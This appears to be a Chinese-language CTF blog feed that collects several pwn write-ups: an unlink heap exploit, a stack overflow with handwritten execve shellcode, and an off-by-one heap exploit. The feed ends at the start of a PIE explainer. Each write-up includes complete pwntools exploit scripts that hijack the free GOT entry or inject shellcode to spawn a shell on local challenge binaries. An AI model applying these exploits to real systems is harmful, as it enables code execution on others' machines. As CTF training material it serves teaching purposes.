class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;aaaa&#x27;</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;bbbb&#x27;</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>) <span class="comment"># 2</span></span><br></pre></td></tr></table></figure><ul><li>先生成3个chunk，chunk2防止chunk1在free的时候与top_chunk合并，并且传入&#x2F;bin&#x2F;sh</li><li>此时的堆布局如下</li></ul><p><img src="/2024/09/01/ZJCTF-2019-EasyHeap-unlink/capture_20240901203630753.bmp"></p><h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><ul><li>unlink需要构造fake_chunk,然后uaf</li><li><strong>利用chunk0构造一个fake_chunk:</strong></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 构造fake_chunk</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(heaparray-<span class="number">0x18</span>)+p64(heaparray-<span class="number">0x10</span>)</span><br><span class="line">payload += p64(<span class="number">0x20</span>) + p64(<span class="number">0x90</span>) <span class="comment"># 伪造chunk0为free_chunk</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">free(<span class="number">1</span>) <span class="comment"># 0,1合并</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>此时堆布局如下，构造的fake_chunk和chunk1合并,红框部分地址应该是main_arena+0x58</li></ul><p><img src="/2024/09/01/ZJCTF-2019-EasyHeap-unlink/capture_20240901204855949.bmp"></p><ul><li><font size="4" color="red"><strong>查看heaparray</strong></font></li></ul><p><img src="/2024/09/01/ZJCTF-2019-EasyHeap-unlink/capture_20240901205436677.bmp"></p><p><font size="4" color="red"><strong>可以很明显的发现，修改chunk0，就是修改heaparray-0x18的值！！</strong></font></p><h3 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h3><ul><li>两个地方都可以修改chunk0，那么就可以先填入free_got,然后修改成system_plt，再free(2)即可：</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(free_got)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">8</span>,p64(system_plt))</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><ul><li><font size="4">第一次edit</font></li></ul><p><img src="/2024/09/01/ZJCTF-2019-EasyHeap-unlink/capture_20240901210431840.bmp"></p><ul><li><font size="4">第二次edit,发现成功修改了</font></li></ul><p><img src="/2024/09/01/ZJCTF-2019-EasyHeap-unlink/capture_20240901210501273.bmp"></p><p><font size="4" color>注意：</font></p><p>这里有点像非栈上格式化字符串漏洞一样了，先建立A -&gt; B -&gt;C的结构，然后修改A其实是修改C</p><h2 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a><strong>完整EXP</strong></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node5.buuoj.cn&quot;,28478)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size of Heap : &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content of heap:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size of Heap : &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content of heap : &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改free_got -&gt; system_plt</span></span><br><span class="line">magic = <span class="number">0x6020C0</span> </span><br><span class="line">heaparray = <span class="number">0x6020E0</span></span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">system_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;aaaa&#x27;</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;bbbb&#x27;</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>) <span class="comment"># 2</span></span><br><span class="line">bug()</span><br><span class="line"><span class="comment"># 构造fake_chunk</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(heaparray-<span class="number">0x18</span>)+p64(heaparray-<span class="number">0x10</span>)</span><br><span class="line">payload += p64(<span class="number">0x20</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">free(<span class="number">1</span>) <span class="comment"># 0,1合并</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(free_got)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">8</span>,p64(system_plt))</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable系列</title>
      <link href="/2024/09/01/pwnable%E7%B3%BB%E5%88%97/"/>
      <url>/2024/09/01/pwnable%E7%B3%BB%E5%88%97/</url>
      
        <content type="html"><![CDATA[<h1 id="pwnable-start-32位"><a href="#pwnable-start-32位" class="headerlink" title="pwnable-start(32位)"></a>pwnable-start(32位)</h1><p><a href="https://buuoj.cn/challenges#pwnable_start">题目链接</a></p><h4 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h4><p><font color="red"><strong>根据汇编看漏洞</strong></font></p><ul><li>直接看ida反汇编，发现看不懂：</li></ul><p><img src="/2024/09/01/pwnable%E7%B3%BB%E5%88%97/capture_20240901105731101.bmp"></p><ul><li>果断选择看汇编：</li></ul><p><img src="/2024/09/01/pwnable%E7%B3%BB%E5%88%97/capture_20240901105741003.bmp"></p><p><font size="4"><strong>根据汇编我们可以知道这里执行了两个函数：</strong></font></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">write(<span class="number">1</span>,buf,<span class="number">0x14</span>)</span><br><span class="line">read(<span class="number">3</span>,buf,<span class="number">0x3c</span>)</span><br></pre></td></tr></table></figure><ul><li>注意到最下面的add esp,0x14，我们可以知道<strong>栈空间只有0x14的长度，但是我们可以输入0x3c的长度</strong>，所以我们可以栈溢出，这就是通过汇编看漏洞。</li><li>我们将ret_address改为栈地址，并将栈地址写入shellcode，那么就可以getshell，接下来看如何泄露栈地址，并且如何手写shellcode。</li></ul><h4 id="gdb分析："><a href="#gdb分析：" class="headerlink" title="gdb分析："></a><font color="red">gdb分析：</font></h4><h4 id="1-泄露栈地址"><a href="#1-泄露栈地址" class="headerlink" title="1.泄露栈地址"></a>1.泄露栈地址</h4><ul><li>目前只有read和write函数可以调用，那么我们覆盖read的返回地址为sys_write上面mov ecx,esp；也就是会再次执行writed，然后将esp的地址输出出来。</li><li>栈地址rbp距离rsp是0x14,再将泄露的地址加上0x14就是栈地址了。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 泄漏栈地址</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;CTF:&quot;</span>)</span><br><span class="line">bug()</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x14</span> + p32(<span class="number">0x08048087</span>) <span class="comment"># 就是mov ecx,esp;的地址</span></span><br><span class="line">p.send(payload)</span><br><span class="line">stack = u32(p.recv(<span class="number">4</span>)) + <span class="number">0x14</span></span><br><span class="line">success(<span class="string">&#x27;stack:&#x27;</span>+<span class="built_in">hex</span>(stack))</span><br></pre></td></tr></table></figure><ul><li><font size="4">此时栈溢出修改ret_address</font></li></ul><p><img src="/2024/09/01/pwnable%E7%B3%BB%E5%88%97/capture_20240901112556053.bmp"></p><ul><li><font size="4">泄露出栈地址：</font></li></ul><p><img src="/2024/09/01/pwnable%E7%B3%BB%E5%88%97/capture_20240901112801146.bmp"></p><h4 id="2-手写shellcode"><a href="#2-手写shellcode" class="headerlink" title="2.手写shellcode"></a>2.手写shellcode</h4><ul><li>我们可以写入0x3c的数据，除了0x14的垃圾数据和覆盖返回地址，还可以写入0x3c-0x18&#x3D;0x24的内容，用<strong>pwntools自动生成的shellcode长度是0x2c，发现是过长了的,所以我们要自己手写shellcode。</strong></li><li><fron size="4" color="red">如何手写？</fron></li></ul><p><strong>shellcode其实就是执行execve(‘&#x2F;bin&#x2F;sh’,0,0)</strong></p><ul><li><p><font size="4">eax &#x3D; 0xb <a href="https://blog.csdn.net/winter2121/article/details/119845443?ops_request_misc=&request_id=&biz_id=102&utm_term=linux%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%8F%B732%E4%BD%8D&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-119845443.142%5Ev100%5Epc_search_result_base8&spm=1018.2226.3001.4187">32位的系统调用号</a>execve是0xb</font></p></li><li><p><font size="4">ebx &#x3D; &#x2F;bin&#x2F;sh\x00</font></p></li><li><p><font size="4">ecx &#x3D; 0</font></p></li><li><p><font size="4">edx &#x3D; 0</font></p></li><li><p><font size="4">int 0x80</font></p></li></ul><p><strong>各个寄存器的数值就是这样的，我们手写的shellcode就要满足这些就行了，注意&#x2F;bin&#x2F;sh的小端序就行了</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;<span class="string">&#x27;/bin/sh\x00&#x27;</span>[::-<span class="number">1</span>].encode(<span class="string">&#x27;utf-8&#x27;</span>).<span class="built_in">hex</span>()</span><br><span class="line"><span class="string">&#x27;0068732f6e69622f&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">shellcode = asm(</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor ecx,ecx; # ecx=0</span></span><br><span class="line"><span class="string">xor edx,edx; # edx=0</span></span><br><span class="line"><span class="string">push edx;</span></span><br><span class="line"><span class="string">push 0x0068732f; # 将/bin/sh\x00入栈</span></span><br><span class="line"><span class="string">push 0x6e69622f;</span></span><br><span class="line"><span class="string">mov ebx,esp; # ebx = /bin/sh\x00</span></span><br><span class="line"><span class="string">mov eax,0xb; # execve 32位系统调用号</span></span><br><span class="line"><span class="string">int 0x80;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">shellcode = asm(<span class="string">&#x27;xor ecx,ecx;xor edx,edx;push edx;push 0x0068732f;push 0x6e69622f;mov ebx,esp;mov eax,0xb;int 0x80;&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x14</span>) + p32(stack) + shellcode</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2024/09/01/pwnable%E7%B3%BB%E5%88%97/capture_20240901114138740.bmp"></p><ul><li>ok,执行了execve(‘&#x2F;bin&#x2F;sh‘，0，0)了，就getshell了</li></ul><h3 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node5.buuoj.cn&quot;,25581)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 泄漏栈地址</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;CTF:&quot;</span>)</span><br><span class="line">bug()</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x14</span> + p32(<span class="number">0x08048087</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">stack = u32(p.recv(<span class="number">4</span>)) + <span class="number">0x14</span></span><br><span class="line">success(<span class="string">&#x27;stack:&#x27;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入shellcode</span></span><br><span class="line"><span class="comment"># shellcode = asm(shellcraft.sh()) 过长 </span></span><br><span class="line"><span class="comment"># 自己构造execve(&#x27;/bin/sh&#x27;,0,0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#shellcode = asm(</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor ecx,ecx; # ecx=0</span></span><br><span class="line"><span class="string">xor edx,edx; # edx=0</span></span><br><span class="line"><span class="string">push edx;</span></span><br><span class="line"><span class="string">push 0x0068732f; # 将/bin/sh\x00入栈</span></span><br><span class="line"><span class="string">push 0x6e69622f;</span></span><br><span class="line"><span class="string">mov ebx,esp; # ebx = /bin/sh\x00</span></span><br><span class="line"><span class="string">mov eax,0xb; # execve 32位系统调用号</span></span><br><span class="line"><span class="string">int 0x80;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&#x27;xor ecx,ecx;xor edx,edx;push edx;push 0x0068732f;push 0x6e69622f;mov ebx,esp;mov eax,0xb;int 0x80;&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x14</span>) + p32(stack) + shellcode</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hitcontraining_heapcreator--简单堆利用</title>
      <link href="/2024/08/31/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/"/>
      <url>/2024/08/31/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="BUUCTF-hitcontraining-heapcreator"><a href="#BUUCTF-hitcontraining-heapcreator" class="headerlink" title="BUUCTF-hitcontraining_heapcreator"></a>BUUCTF-hitcontraining_heapcreator</h1><ul><li><p><a href="https://buuoj.cn/challenges#hitcontraining_heapcreator">题目链接</a></p></li><li><p>glibc2.24</p></li></ul><p><font size="4"><strong>很明显的堆菜单题目</strong></font></p><p><img src="/2024/08/31/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/%E6%80%BB%E8%A7%88.bmp"></p><ul><li><font size="4" color="red"><strong>menu</strong></font></li></ul><p><img src="/2024/08/31/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/menu.bmp"></p><ul><li><font size="4" color="red"><strong>create_heap</strong></font></li></ul><p><img src="/2024/08/31/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/add.bmp"></p><ul><li><font size="4" color="red"><strong>delete_heap</strong></font></li></ul><p><img src="/2024/08/31/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/delete.bmp"></p><ul><li><font size="4" color="red"><strong>edit_heap</strong></font></li></ul><p><img src="/2024/08/31/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/edit.bmp"></p><ul><li><font size="4" color="red"><strong>show_heap</strong></font></li></ul><p><img src="/2024/08/31/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/show.bmp"></p><h3 id="分析："><a href="#分析：" class="headerlink" title="分析："></a><font color="red">分析：</font></h3><ul><li>各个功能块都展示完了，发现在edit_heap有一个**<font color="red">off_by_one漏洞，那么我们可以修改下一个chunk的size**</font></li><li>将其free掉,再add回来，就可以修改chunk的内容，注意到show_heap是一个**%s + 地址**，那么我们将其填入free_got，就可以得到free的真实地址，从而泄露libc，获得system，但是光system不够啊。</li><li>再注意到delete_heap,是free(地址),我们将<strong>free_got -&gt; system</strong>，再在那个地址填入<strong>b’&#x2F;bin&#x2F;sh\x00’</strong>,就可以getshell了</li><li>具体思路就这些了，来看gdb调试的：</li></ul><h3 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a><font color="red">gdb调试</font></h3><p><font size="4" color="red">1.申请三次chunk</font></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;aaaa&#x27;</span>) <span class="comment"># 0 -&gt; 2个chunk</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;bbbb&#x27;</span>) <span class="comment"># 1 -&gt; 4个chunk</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;cccc&#x27;</span>) <span class="comment"># 2 -&gt; 6个chunk</span></span><br><span class="line">bug()</span><br></pre></td></tr></table></figure><p><img src="/2024/08/31/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/1.bmp"></p><ul><li>调用了三次create_heap,有6个chunk,看看其内容是什么</li></ul><p><img src="/2024/08/31/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/2.bmp"></p><p>可以猜测，相比于正常的chunk结构，这里前面多了一个chunk的结构体，记录了其size和user_data_address</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">heap</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">    <span class="type">int</span>* heaparray[i] <span class="comment">// 大概意思 </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font size="4" color="red"><strong>2.利用off_by_one修改size</strong></font></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="number">0</span>)*<span class="number">2</span> + p8(<span class="number">0x81</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">free(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><img src="/2024/08/31/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/3.bmp"></p><ul><li>从箭头处,也就是data处填入数据，往heaparray[0]处地址写入&#x2F;bin&#x2F;sh，修改chunk1结构体size,<strong>使得下方0x70的内容被合并为一个chunk</strong>，之后的free和malloc都会被当成一个chunk处理</li></ul><p><font size="4" color="red"><strong>3.add修改show部分的地址为free_got，泄露libc</strong></font></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> 此时<span class="number">1</span>,<span class="number">2</span>合并，修改<span class="number">2</span>号chunk_data为free_got，show出来泄漏真实地址</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">8</span> + p64(<span class="number">0x8</span>) + p64(free_got) <span class="comment">#0x8记录的是chunk2的size，也是后面edit的长度，0x8,0x10都可以</span></span><br><span class="line">add(<span class="number">0x70</span>,payload)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">free_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;free_address:&quot;</span>,<span class="built_in">hex</span>(free_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;free&#x27;</span>,free_addr)</span><br><span class="line">base = free_addr - libc.dump(<span class="string">&#x27;free&#x27;</span>)</span><br><span class="line">system = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="/2024/08/31/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/4.bmp"></p><ul><li>对于chunk2,也就是heaparray[2]来说，它的内容已经更改，show的时候就是show(0x602018)，也就是将free_got指向的内容给输出出来，也就是输出free的真实地址</li></ul><p><img src="/2024/08/31/hitcontraining-heapcreator-%E7%AE%80%E5%8D%95%E5%A0%86%E5%88%A9%E7%94%A8/6.bmp"></p><ul><li>此时的heaparray内容如上，因此show可以将free真实地址show出来</li></ul><p><font size="4" color="red"><strong>4.修改free_got-&gt;system，然后执行free</strong></font></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改free_got-&gt;system</span></span><br><span class="line">edit(<span class="number">2</span>,p64(system))</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher3 <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node5.buuoj.cn&quot;,27902)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size of Heap : &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content of heap:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>): <span class="comment"># off_by_one</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content of heap : &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;aaaa&#x27;</span>) <span class="comment"># 0 -&gt; 2个chunk</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;bbbb&#x27;</span>) <span class="comment"># 1 -&gt; 4个chunk</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;cccc&#x27;</span>) <span class="comment"># 2 -&gt; 6个chunk</span></span><br><span class="line"><span class="comment"># bug()</span></span><br><span class="line"><span class="comment"># 利用off_by_one修改size</span></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="number">0</span>)*<span class="number">2</span> + p8(<span class="number">0x81</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 此时1,2合并，修改2号chunk_data为free_got，show出来泄漏真实地址</span></span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">8</span> + p64(<span class="number">0x10</span>) +p64(free_got)</span><br><span class="line">add(<span class="number">0x70</span>,payload)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">free_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;free_address:&quot;</span>,<span class="built_in">hex</span>(free_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;free&#x27;</span>,free_addr)</span><br><span class="line">base = free_addr - libc.dump(<span class="string">&#x27;free&#x27;</span>)</span><br><span class="line">system = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改free_got-&gt;system</span></span><br><span class="line">edit(<span class="number">2</span>,p64(system))</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><ul><li>在分析各个功能块的时候就要有想法，简单堆题一定要对地址掌握收悉。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PIE保护</title>
      <link href="/2024/08/31/PIE%E4%BF%9D%E6%8A%A4/"/>
      <url>/2024/08/31/PIE%E4%BF%9D%E6%8A%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="PIE保护"><a href="#PIE保护" class="headerlink" title="PIE保护"></a>PIE保护</h1><h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>参考：<a href="https://xz.aliyun.com/t/12809?time__1311=GqGxuDcD2Dg0YGN4WxUxYq+W5q5Mf+bD#toc-0">https://xz.aliyun.com/t/12809?time__1311=GqGxuDcD2Dg0YGN4WxUxYq%2BW5q5Mf%2BbD#toc-0</a></p><p><font size="4" color="red">pie保护简单来说就是程序每次载入内存的地址都会发生变化，地址是随机的</font></p><ul><li>从ida来看，地址基本都是<strong>四位数</strong>，如下：</li></ul><p><img src="/2024/08/31/PIE%E4%BF%9D%E6%8A%A4/ida%E7%9C%8Bpie.bmp"></p><ul><li>差别还是很明显的，因此我们不能直接利用这些地址操作，要先寻找到pie的基地址，ida给出来的只是偏移地址。</li></ul><p><font size="4" color="red">程序的实际运行地址 &#x3D; 程序加载基址 + 程序偏移地址</font></p><ul><li><fron color="red">注意：即使开启了pie，真实地址和ida中所看到的偏移地址的末三位数字肯定还是一样的，这是由于内存页对其的原理。</fron></li></ul><h3 id="关于开启pie的gdb调试"><a href="#关于开启pie的gdb调试" class="headerlink" title="关于开启pie的gdb调试"></a>关于开启pie的gdb调试</h3><ul><li><strong>指令</strong>：</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">b *$rebase(偏移地址) <span class="comment"># 偏移地址从ida看</span></span><br></pre></td></tr></table></figure><ul><li>注意程序要先run起来，才可以打断点</li></ul><h3 id="具体题目"><a href="#具体题目" class="headerlink" title="具体题目"></a>具体题目</h3><h3 